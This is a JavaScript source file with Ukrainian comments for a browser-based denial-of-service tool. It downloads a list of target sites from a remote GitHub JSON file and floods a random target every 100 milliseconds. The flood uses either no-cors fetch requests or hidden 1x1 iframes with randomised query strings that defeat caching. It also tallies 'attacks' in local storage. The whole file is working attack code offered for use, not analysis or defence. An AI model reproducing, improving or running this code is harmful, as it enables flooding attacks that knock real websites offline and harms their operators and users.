// Звідси будуть завантажуватись цілі
const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/test/sites.json'


// Функції для керування документом

let frameDiv = $("#frame")
let attacks = $("#attacks")

// Функції рандому
const add_count = () => attacks.text(parseInt(attacks.text())+1) // Кількість атак

const randint = (num) => Math.floor(Math.random() * num) // Рандомне ціле число

const getRandomArbitrary = (min, max) => Math.random() * (max - min) + min

async function getSalt(target) {
	// Сіль з нашого Криму

	const now = (new Date()).getTime();
	return target + '?' + now + getRandomArbitrary(100_000, 1_000_000);
}


// Завантаження цілей
async function getTarget() {
	$("#load").remove()
	$("<p>", {id:"load"}).text("Завантажуємо цілі...")
	.appendTo(box);

    targets = await fetch(targetSource)
    .catch((e) => {
    	$("#load").text("Помилка завантаження!");
    	alert(`Помилка!\nПеревірте підключення до інтернету!\nТекст помилки: ${e}`);
    });
    if (targets instanceof Response) {
    	data = await targets.json();

		targets = [];

		// Фільтрування цілей
		for (let i = 0; i < data.length; i++) {
		    if (['post', 'get'].includes(data[i].method)) {
		        targets.push(data[i])
		    }
		};
		$("#load").remove()
	   	
	    return targets[randint(targets.length)] // Рандомна ціль
    }
    return null
}


const Frames = {
	async draw(target, id) {
		$("<iframe>", {
			src: target,
			id: "frame" + id,
			frameborder: 0,
			width: 1,
			height: 1
		}).appendTo(frameDiv);
	},
	clear() {frameDiv.empty()}
}


// Відображення цілі та методу атаки
let targetField = $("#target")
let methodField = $("#method")

setTarget = (target) => {
	if (target != null) {
		targetField.text(target.page);
	    methodField.text(target.method.toUpperCase());
	    return true
	} else {
		return false
	}
}


class Doser {
    attack = false; // Status of attack
    interval;
    saver;

    async start(isFetch=false) {
    	this.attack = true;

        // Запуск атаки

        btn.text("Стоп");
        let target = await getTarget();

        let set = setTarget(target);
        if (!set) {
        	this.attack = false;
        	btn.text("Старт!");
        	return
        }
        console.log(target);

        this.interval = setInterval(isFetch ? async function () {
            // Запити
            let target = await getTarget();

            await fetch([target.page], {
	            method: target.method,
	            mode: 'no-cors',
				referrerPolicy: 'no-referrer'
	        }).then(() => {
	            // Після запиту

	            console.log("Ok!");
	            add_count();
	        })
        } : async function () {

        	let targett = await getSalt(target.page); // Беремо сіль з нашого Криму

        	// Надсилання запиту на сайт за допомогою iframe
        	await Frames.draw(targett, randint(0, 100_000));
        	console.log(targett);

        	add_count();

        	if ($("#frame")[0].childElementCount >= 200) {Frames.clear()};
        }, 100);

        this.saver = setInterval(() => {
        	let atck = LocalStorage.getItem("attacks")

        	atck = parseInt(atck == NaN ? 0 : atck) // Попередні атаки
        	LocalStorage.setItem("attacks", atck + parseInt(attacks.text()))
        }, 3000)
    };
    stop() {
    	this.attack = false;
    	clearInterval(this.interval);
    	clearInterval(this.saver);
    	Frames.clear()
    	btn.text("Старт!");
    };
}



let btn = $("#button")
let LocalStorage = window.localStorage
let box = $(".box")

$(() => {
	Doser = new Doser // Ініціалізація воркера

	if (!LocalStorage.getItem("check_license")) {
		alert('Прочитайте ліцензію в розділі "Ресурси"!')
		LocalStorage.setItem("check_license", "true")
	}

	btn.click((e) => {
		e.preventDefault();

		!Doser.attack ? Doser.start() : Doser.stop();
	});
	$("#attackCount").click(() => {
		let a = LocalStorage.getItem("attacks")
		alert(`Взагалом атаковано: ${!a ? 0 : a}`)
	})
	/*
	$(".item").click(() => {
		copy(window.location + `#${$(this.id)}`)
	})
	*/
})

// Слава Україні!